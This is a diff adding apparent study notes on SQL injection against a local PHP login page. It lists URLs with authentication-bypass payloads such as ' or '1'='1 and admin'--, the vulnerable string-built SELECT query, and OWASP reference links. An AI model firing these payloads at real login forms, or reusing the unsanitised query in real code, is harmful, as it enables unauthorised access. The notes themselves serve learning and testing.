@@ -1,0 +1,32 @@
+http://127.0.0.1/bookwarms/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1
+http://127.0.0.1/bookwarms/login.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1
+
+http://127.0.0.1/bookwarms/index.php?username=Eck&amp;password=admin
+http://127.0.0.1/bookwarms/login.php?username=Eck&amp;password=admin
+http://127.0.0.1/bookwarms/login.php/username=Eck&password=admin
+http://127.0.0.1/bookwarms/login.php/username=Eck&password=admin-
+
+http://127.0.0.1/bookwarms/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo
+
+SELECT * FROM student WHERE Username = '$username' AND Password = '$password';
+
+SELECT * FROM student WHERE username = '' OR '1'='1' AND Password = '';
+as php code:
+$sql = "SELECT * FROM student WHERE username = \'\' OR \'1\'=\'1\' AND Password = \'\';";
+
+SELECT * FROM student WHERE Username = 'admin' OR '1'='1' AND password = 'Password';
+SELECT * FROM student WHERE Username = 'admin'--' AND Password = '';
+
+php code:
+$sql = "SELECT * FROM `student` WHERE 1;";
+
+SELECT * FROM users WHERE login='' or 1=1 LIMIT 0, 25
+
+
+
+https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
+https://stackoverflow.com/questions/61365104/inject-sql-query-into-http-url
+
+https://owasp.org/www-community/Injection_Flaws
+
